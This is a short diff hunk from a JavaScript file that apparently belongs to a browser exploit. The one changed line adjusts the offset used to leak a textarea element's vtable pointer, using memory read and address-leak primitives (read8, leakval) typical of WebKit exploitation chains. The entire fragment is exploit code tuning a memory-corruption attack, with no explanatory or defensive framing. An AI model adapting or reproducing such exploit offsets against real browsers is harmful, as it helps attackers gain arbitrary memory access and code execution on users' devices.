@@ -136,7 +136,7 @@ async function prepare(p) {
 
     let textArea = document.createElement("textarea");
 
-    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x10));
+    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
 
     let textAreaVtable = p.read8(textAreaVtPtr);
 
